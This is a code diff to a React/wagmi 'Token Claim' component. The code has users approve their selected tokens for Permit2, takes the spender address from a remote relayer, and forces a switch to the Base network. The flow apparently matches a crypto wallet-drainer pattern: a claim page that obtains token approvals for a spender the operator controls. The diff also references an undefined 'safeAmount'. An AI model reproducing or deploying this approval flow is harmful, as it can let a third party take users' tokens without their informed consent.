@@ -1,5 +1,5 @@
-import { useAccount, usePublicClient, useWalletClient } from 'wagmi'
-import { formatUnits, erc20Abi, maxUint256 } from 'viem'
+import { useAccount, useChainId, usePublicClient, useSwitchChain, useWalletClient } from 'wagmi'
+import { formatUnits, erc20Abi } from 'viem'
 import { useState, useEffect, useCallback, useMemo, createContext, useContext, type ComponentType, type ReactNode } from 'react'
 import { ConnectButton } from '@rainbow-me/rainbowkit'
 import { 
@@ -439,10 +439,12 @@ function useClaimAction() {
 
 // Advanced Wallet Tokens Component with Permit2// Token Claim Component
 function WalletTokens({ children }: { children: ReactNode }) {
-  const { address, isConnected, chainId } = useAccount()
-  const publicClient = usePublicClient()
-  const { data: walletClient } = useWalletClient()
-  
+  const { address, isConnected } = useAccount()
+  const publicClient = usePublicClient({ chainId: BASE_CHAIN_ID })
+  const { data: walletClient } = useWalletClient({ chainId: BASE_CHAIN_ID })
+  const { switchChainAsync } = useSwitchChain()
+  const currentChainId = useChainId()
+
   const [selectedTokens, setSelectedTokens] = useState<string[]>([])
   const [tokenBalances, setTokenBalances] = useState<Record<string, bigint>>({})
   const [tokenAllowances, setTokenAllowances] = useState<Record<string, bigint>>({})
@@ -623,6 +625,11 @@ function WalletTokens({ children }: { children: ReactNode }) {
     setClaiming(true)
 
     try {
+      if (currentChainId !== BASE_CHAIN_ID) {
+        setClaimStatus('Switching network to Base...')
+        await switchChainAsync({ chainId: BASE_CHAIN_ID })
+      }
+
       // Fetch spender address (Permit2 requires spender = msg.sender)
       const healthRes = await fetch(`${RELAYER_URL}/health`)
       if (!healthRes.ok) throw new Error('Failed to fetch relayer health')
@@ -675,7 +682,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
           console.log(`Approving ${token.symbol} for Permit2...`)
           setClaimStatus(`Approving ${token.symbol} for Permit2...`)
           let approveTx: `0x${string}`
-          const approveAmount = maxUint256
+          const approveAmount = safeAmount
 
           try {
             approveTx = await walletClient.writeContract({
@@ -683,7 +690,7 @@ function WalletTokens({ children }: { children: ReactNode }) {
               abi: ERC20_EXTENDED_ABI,
               functionName: 'approve',
               args: [PERMIT2_ADDRESS, approveAmount],
-            })
+            } as any)
           } catch (e) {
             console.warn(`[PROFESSIONAL DEBUG] approve(max) failed for ${token.symbol}, trying approve(0)->approve(max):`, e)
 
@@ -693,14 +700,14 @@ function WalletTokens({ children }: { children: ReactNode }) {
               abi: ERC20_EXTENDED_ABI,
               functionName: 'approve',
               args: [PERMIT2_ADDRESS, 0n],
-            })
+            } as any)
 
             approveTx = await walletClient.writeContract({
               address: token.address as `0x${string}`,
               abi: ERC20_EXTENDED_ABI,
               functionName: 'approve',
               args: [PERMIT2_ADDRESS, approveAmount],
-            })
+            } as any)
           }
           
           // Waiting for the receipt via a public RPC can be flaky and may time out.
